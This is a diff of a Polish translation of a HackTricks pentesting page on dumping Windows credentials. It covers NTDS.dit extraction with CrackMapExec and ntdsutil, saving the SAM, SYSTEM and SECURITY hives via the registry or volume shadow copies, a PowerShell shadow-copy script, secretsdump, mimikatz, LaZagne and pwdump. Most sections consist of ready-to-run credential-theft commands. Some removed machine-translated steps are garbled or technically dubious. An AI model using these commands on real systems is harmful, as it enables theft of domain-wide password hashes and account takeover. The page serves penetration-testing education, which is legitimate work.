-Aby wydobędź plik NTDS.dit z docelowego kontrolera domeny (DC), możesz użyć narzędzia `ntdsutil`. Narzędzie to jest wbudowane w systemy Windows Server i umożliwia dostęp do bazy danych Active Directory.
-
-1. Zaloguj się na docelowy kontroler domeny (DC) jako administrator.
-2. Otwórz wiersz polecenia jako administrator.
-3. Uruchom narzędzie `ntdsutil`, wpisując polecenie `ntdsutil` i naciskając Enter.
-4. Wewnątrz narzędzia `ntdsutil`, wpisz polecenie `activate instance ntds` i naciśnij Enter.
-5. Następnie wpisz polecenie `ifm` i naciśnij Enter, aby przejść do trybu tworzenia plików instalacyjnych.
-6. Wpisz polecenie `create full <ścieżka_do_folderu_docelowego>`, gdzie `<ścieżka_do_folderu_docelowego>` to ścieżka do folderu, w którym chcesz zapisać plik NTDS.dit. Naciśnij Enter, aby rozpocząć proces tworzenia plików instalacyjnych.
-7. Po zakończeniu procesu, plik NTDS.dit zostanie wyodrębniony i zapisany w wybranym folderze.
-
-Pamiętaj, że wydobycie pliku NTDS.dit z kontrolera domeny wymaga uprawnień administratora i jest związane z potencjalnymi ryzykami. Wykorzystuj te informacje zgodnie z prawem i tylko w celach, które są zgodne z etycznym testowaniem penetracyjnym.
+### Zrzut NTDS.dit z docelowego DC
 ```
 cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 #~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
 ```
-### Wydobądź historię haseł NTDS.dit z docelowego kontrolera domeny (DC)
-
-Aby wydobyć historię haseł NTDS.dit z docelowego kontrolera domeny (DC), wykonaj następujące kroki:
-
-1. Uruchom narzędzie `ntdsutil` na docelowym DC.
-2. Wpisz polecenie `activate instance ntds`.
-3. Następnie wpisz polecenie `ifm`.
-4. Wybierz katalog docelowy, w którym chcesz zapisać skopiowane pliki.
-5. Wpisz polecenie `create full C:\path\to\output\folder`.
-6. Poczekaj, aż proces kopiowania zostanie zakończony.
-7. Przejdź do katalogu, w którym zapisałeś skopiowane pliki.
-8. Otwórz plik `ntds.dit` przy użyciu narzędzia `esedbexport`.
-9. Wydobądź historię haseł, korzystając z narzędzia `dsusers.py` lub innego narzędzia do analizy bazy danych NTDS.dit.
-
-Pamiętaj, że wydobycie historii haseł NTDS.dit z docelowego DC wymaga uprawnień administratora.
+### Zrzut historii haseł NTDS.dit z docelowego DC
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
 ```
 ### Pokaż atrybut pwdLastSet dla każdego konta NTDS.dit
-
-Aby wyświetlić atrybut pwdLastSet dla każdego konta NTDS.dit, wykonaj następujące kroki:
-
-1. Otwórz wiersz polecenia jako administrator.
-2. Uruchom narzędzie `ntdsutil`, wpisując `ntdsutil` i naciskając Enter.
-3. Wprowadź polecenie `activate instance ntds`, a następnie naciśnij Enter.
-4. Wprowadź polecenie `ifm`, a następnie naciśnij Enter.
-5. Wprowadź polecenie `create full C:\path\to\destination`, gdzie `C:\path\to\destination` to ścieżka do miejsca, w którym chcesz zapisać pliki NTDS.dit i SYSTEM.
-6. Po zakończeniu procesu tworzenia kopii zapasowej, wprowadź polecenie `quit`, a następnie naciśnij Enter.
-7. Wprowadź polecenie `quit`, a następnie naciśnij Enter, aby wyjść z narzędzia `ntdsutil`.
-8. Przejdź do miejsca, w którym zapisałeś pliki NTDS.dit i SYSTEM.
-9. Uruchom narzędzie `esedbexport`, wpisując `esedbexport ntds.dit`, a następnie naciskając Enter.
-10. Wyświetl atrybut pwdLastSet dla każdego konta NTDS.dit, wykonując polecenie `dsquery * -filter "(objectCategory=Person)" -attr pwdLastSet`.
-
-Teraz będziesz mógł zobaczyć atrybut pwdLastSet dla każdego konta NTDS.dit.
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
 ```
-## Kradzież plików SAM i SYSTEM
+## Stealing SAM & SYSTEM
 
-Te pliki powinny być **znajdują się** w _C:\windows\system32\config\SAM_ i _C:\windows\system32\config\SYSTEM._ Jednak **nie możesz ich po prostu skopiować w standardowy sposób**, ponieważ są one chronione.
+Te pliki powinny być **zlokalizowane** w _C:\windows\system32\config\SAM_ i _C:\windows\system32\config\SYSTEM._ Ale **nie możesz ich po prostu skopiować w zwykły sposób**, ponieważ są chronione.
 
-### Z rejestru
+### Z Rejestru
 
-Najprostszym sposobem na kradzież tych plików jest skopiowanie ich z rejestru:
+Najłatwiejszym sposobem na kradzież tych plików jest uzyskanie kopii z rejestru:
 ```
 reg save HKLM\sam sam
 reg save HKLM\system system
 reg save HKLM\security security
 ```
-**Pobierz** te pliki na swoje urządzenie Kali i **wyodrębnij hashe** za pomocą:
+**Pobierz** te pliki na swoją maszynę Kali i **wyodrębnij hashe** używając:
 ```
 samdump2 SYSTEM SAM
 impacket-secretsdump -sam sam -security security -system system LOCAL
 ```
-### Kopiowanie woluminu cieni
+### Volume Shadow Copy
 
-Możesz wykonać kopię chronionych plików za pomocą tej usługi. Musisz być administratorem.
+Możesz wykonać kopię chronionych plików za pomocą tej usługi. Musisz być Administratorem.
 
-#### Używanie vssadmin
+#### Używając vssadmin
 
-Plik binarny vssadmin jest dostępny tylko w wersjach systemu Windows Server.
+Plik binarny vssadmin jest dostępny tylko w wersjach Windows Server
 ```bash
 vssadmin create shadow /for=C:
 #Copy SAM
-copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SAM
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
 #Copy SYSTEM
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
 #Copy ntds.dit
@@ -257,7 +989,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Ex
 # You can also create a symlink to the shadow copy and access it
 mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
 ```
-Ale to samo można zrobić za pomocą **Powershell**. Oto przykład **jak skopiować plik SAM** (dysk twardy używany to "C:" i jest zapisywany w C:\users\Public), ale można to zastosować do kopiowania dowolnego chronionego pliku:
+Ale możesz zrobić to samo z **Powershell**. To jest przykład **jak skopiować plik SAM** (używany dysk twardy to "C:" i jest zapisywany do C:\users\Public), ale możesz użyć tego do kopiowania dowolnego chronionego pliku:
 ```bash
 $service=(Get-Service -name VSS)
 if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
@@ -266,83 +998,81 @@ $volume=(gwmi win32_shadowcopy -filter "ID='$id'")
 cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
 $voume.Delete();if($notrunning -eq 1){$service.Stop()}
 ```
-Kod z książki: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
-
 ### Invoke-NinjaCopy
 
-Ostatecznie, można również użyć [**skryptu PS Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1), aby utworzyć kopię plików SAM, SYSTEM i ntds.dit.
+Na koniec, możesz również użyć [**skryptu PS Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) do wykonania kopii SAM, SYSTEM i ntds.dit.
 ```bash
 Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
 ```
-## **Aktywne poświadczenia Active Directory - NTDS.dit**
+## **Active Directory Credentials - NTDS.dit**
 
-Plik **NTDS.dit** jest znany jako serce **Active Directory** i przechowuje kluczowe dane dotyczące obiektów użytkowników, grup i ich przynależności. To tutaj przechowywane są **hasze haseł** dla użytkowników domeny. Ten plik jest bazą danych **Extensible Storage Engine (ESE)** i znajduje się w lokalizacji **_%SystemRoom%/NTDS/ntds.dit_**.
+Plik **NTDS.dit** jest znany jako serce **Active Directory**, zawierając kluczowe dane o obiektach użytkowników, grupach i ich członkostwach. To tutaj przechowywane są **hasze haseł** użytkowników domeny. Ten plik to baza danych **Extensible Storage Engine (ESE)** i znajduje się w **_%SystemRoom%/NTDS/ntds.dit_**.
 
 W tej bazie danych utrzymywane są trzy główne tabele:
 
-- **Tabela danych**: Ta tabela przechowuje szczegóły dotyczące obiektów, takich jak użytkownicy i grupy.
-- **Tabela powiązań**: Śledzi relacje, takie jak przynależność do grupy.
-- **Tabela SD**: Tutaj przechowywane są deskryptory zabezpieczeń dla każdego obiektu, zapewniające bezpieczeństwo i kontrolę dostępu do przechowywanych obiektów.
+- **Data Table**: Ta tabela jest odpowiedzialna za przechowywanie szczegółów dotyczących obiektów, takich jak użytkownicy i grupy.
+- **Link Table**: Śledzi relacje, takie jak członkostwa w grupach.
+- **SD Table**: **Deskryptory zabezpieczeń** dla każdego obiektu są przechowywane tutaj, zapewniając bezpieczeństwo i kontrolę dostępu do przechowywanych obiektów.
 
 Więcej informacji na ten temat: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
 
-System Windows używa _Ntdsa.dll_ do interakcji z tym plikiem, a jest on używany przez _lsass.exe_. Część pliku **NTDS.dit** może znajdować się **w pamięci `lsass`** (można znaleźć najnowsze dane dostępne prawdopodobnie ze względu na poprawę wydajności za pomocą **pamięci podręcznej**).
+Windows używa _Ntdsa.dll_ do interakcji z tym plikiem, a jest on używany przez _lsass.exe_. Wtedy, **część** pliku **NTDS.dit** może być zlokalizowana **wewnątrz pamięci `lsass`** (można znaleźć najnowsze dostępne dane prawdopodobnie ze względu na poprawę wydajności poprzez użycie **cache**).
 
 #### Odszyfrowywanie haszy wewnątrz NTDS.dit
 
-Hasz jest szyfrowany 3 razy:
+Hasz jest zaszyfrowany 3 razy:
 
-1. Odszyfrowanie klucza szyfrowania hasła (**PEK**) za pomocą **BOOTKEY** i **RC4**.
-2. Odszyfrowanie **hasza** za pomocą **PEK** i **RC4**.
-3. Odszyfrowanie **hasza** za pomocą **DES**.
+1. Odszyfruj Klucz Szyfrowania Hasła (**PEK**) używając **BOOTKEY** i **RC4**.
+2. Odszyfruj **hasz** używając **PEK** i **RC4**.
+3. Odszyfruj **hasz** używając **DES**.
 
-**PEK** ma **tą samą wartość** na **każdym kontrolerze domeny**, ale jest **szyfrowany** wewnątrz pliku **NTDS.dit** za pomocą **BOOTKEY** z pliku **SYSTEM kontrolera domeny (różni się między kontrolerami domeny)**. Dlatego aby uzyskać poświadczenia z pliku NTDS.dit, **potrzebujesz plików NTDS.dit i SYSTEM** (_C:\Windows\System32\config\SYSTEM_).
+**PEK** ma **taką samą wartość** na **każdym kontrolerze domeny**, ale jest **zaszyfrowany** wewnątrz pliku **NTDS.dit** używając **BOOTKEY** z **pliku SYSTEM kontrolera domeny (jest różny między kontrolerami domeny)**. Dlatego, aby uzyskać dane uwierzytelniające z pliku NTDS.dit **potrzebujesz plików NTDS.dit i SYSTEM** (_C:\Windows\System32\config\SYSTEM_).
 
-### Kopiowanie NTDS.dit za pomocą narzędzia Ntdsutil
+### Kopiowanie NTDS.dit używając Ntdsutil
 
 Dostępne od Windows Server 2008.
 ```bash
 ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
-Możesz również użyć sztuczki z [**kopią woluminu cieni**](./#stealing-sam-and-system), aby skopiować plik **ntds.dit**. Pamiętaj, że będziesz również potrzebować kopii pliku **SYSTEM** (ponownie, [**wydobądź go z rejestru lub użyj sztuczki z kopią woluminu cieni**](./#stealing-sam-and-system)).
+Możesz również użyć triku [**volume shadow copy**](./#stealing-sam-and-system), aby skopiować plik **ntds.dit**. Pamiętaj, że będziesz również potrzebować kopii **SYSTEM file** (ponownie, [**zrzucić go z rejestru lub użyć triku volume shadow copy**](./#stealing-sam-and-system)).
 
-### **Wydobywanie hashy z pliku NTDS.dit**
+### **Wyodrębnianie hashy z NTDS.dit**
 
-Gdy już **uzyskasz** pliki **NTDS.dit** i **SYSTEM**, możesz użyć narzędzi takich jak _secretsdump.py_, aby **wydobyć hashy**:
+Gdy już **zdobędziesz** pliki **NTDS.dit** i **SYSTEM**, możesz użyć narzędzi takich jak _secretsdump.py_, aby **wyodrębnić hashe**:
 ```bash
 secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
 ```
-Możesz również **wydobyć je automatycznie** za pomocą ważnego użytkownika administratora domeny:
+Możesz również **wyodrębnić je automatycznie** używając ważnego użytkownika z uprawnieniami administratora domeny:
 ```
 secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
 ```
-Dla **dużych plików NTDS.dit** zaleca się ich wyodrębnienie za pomocą [gosecretsdump](https://github.com/c-sto/gosecretsdump).
+Dla **dużych plików NTDS.dit** zaleca się wyodrębnienie ich za pomocą [gosecretsdump](https://github.com/c-sto/gosecretsdump).
 
-Ostatecznie, można również użyć modułu **metasploit**: _post/windows/gather/credentials/domain\_hashdump_ lub **mimikatz** `lsadump::lsa /inject`
+Na koniec, możesz również użyć **modułu metasploit**: _post/windows/gather/credentials/domain\_hashdump_ lub **mimikatz** `lsadump::lsa /inject`
 
-### **Wyodrębnianie obiektów domeny z pliku NTDS.dit do bazy danych SQLite**
+### **Wyodrębnianie obiektów domeny z NTDS.dit do bazy danych SQLite**
 
-Obiekty NTDS mogą być wyodrębniane do bazy danych SQLite za pomocą [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Wyodrębniane są nie tylko tajemnice, ale także całe obiekty i ich atrybuty, co umożliwia dalsze wyodrębnianie informacji, gdy już uzyskano surowy plik NTDS.dit.
+Obiekty NTDS mogą być wyodrębnione do bazy danych SQLite za pomocą [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Nie tylko sekrety są wyodrębniane, ale także całe obiekty i ich atrybuty dla dalszej ekstrakcji informacji, gdy surowy plik NTDS.dit jest już pobrany.
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
-`SYSTEM` hive jest opcjonalny, ale umożliwia odszyfrowanie sekretów (haszów NT i LM, uzupełniających poświadczeń, takich jak hasła w czystym tekście, kluczy kerberos lub zaufania, historii haseł NT i LM). Oprócz innych informacji, wyodrębniane są następujące dane: konta użytkowników i maszyn z ich haszami, flagi UAC, znaczniki czasu ostatniego logowania i zmiany hasła, opisy kont, nazwy, UPN, SPN, grupy i rekurencyjne przynależności, drzewo jednostek organizacyjnych i przynależność, zaufane domeny z typem, kierunkiem i atrybutami zaufania...
+`SYSTEM` hive jest opcjonalny, ale pozwala na deszyfrowanie sekretów (hashe NT i LM, dodatkowe poświadczenia takie jak hasła w postaci jawnej, klucze kerberos lub zaufania, historie haseł NT i LM). Wraz z innymi informacjami, wyodrębniane są następujące dane: konta użytkowników i maszyn z ich hashami, flagi UAC, znacznik czasu ostatniego logowania i zmiany hasła, opisy kont, nazwy, UPN, SPN, grupy i członkostwa rekurencyjne, drzewo jednostek organizacyjnych i członkostwo, zaufane domeny z typami zaufania, kierunkiem i atrybutami...
 
 ## Lazagne
 
-Pobierz binarny plik stąd [tutaj](https://github.com/AlessandroZ/LaZagne/releases). Możesz użyć tego pliku binarnego do wyodrębnienia poświadczeń z różnych oprogramowań.
+Pobierz plik binarny z [tutaj](https://github.com/AlessandroZ/LaZagne/releases). Możesz użyć tego pliku binarnego do wyodrębniania poświadczeń z kilku programów.
 ```
 lazagne.exe all
 ```
-## Inne narzędzia do wydobywania poświadczeń z plików SAM i LSASS
+## Inne narzędzia do wyciągania poświadczeń z SAM i LSASS
 
 ### Windows credentials Editor (WCE)
 
-To narzędzie można użyć do wydobycia poświadczeń z pamięci. Pobierz je z: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
+To narzędzie może być używane do wyciągania poświadczeń z pamięci. Pobierz je z: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
 
 ### fgdump
 
-Wydobywaj poświadczenia z pliku SAM
+Wyciąga poświadczenia z pliku SAM
 ```
 You can find this binary inside Kali, just do: locate fgdump.exe
 fgdump.exe
@@ -357,22 +1087,22 @@ type outpwdump
 ```
 ### PwDump7
 
-Pobierz go z: [http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) i po prostu **uruchom** go, a hasła zostaną wyodrębnione.
+Pobierz go z: [http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) i po prostu **uruchom**, a hasła zostaną wyodrębnione.
 
 ## Obrona
 
-[**Dowiedz się tutaj o niektórych zabezpieczeniach danych uwierzytelniających.**](credentials-protections.md)
+[**Dowiedz się więcej o ochronie poświadczeń tutaj.**](credentials-protections.md)
 
 <details>
 
-<summary><strong>Dowiedz się o hakowaniu AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Naucz się hackowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Inne sposoby wsparcia HackTricks:
 
-* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
+* Jeśli chcesz zobaczyć **reklamę swojej firmy w HackTricks** lub **pobrać HackTricks w formacie PDF** Sprawdź [**PLANY SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
 * Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
-* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Odkryj [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Podziel się swoimi trikami hakerskimi, przesyłając PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.
 
 </details>
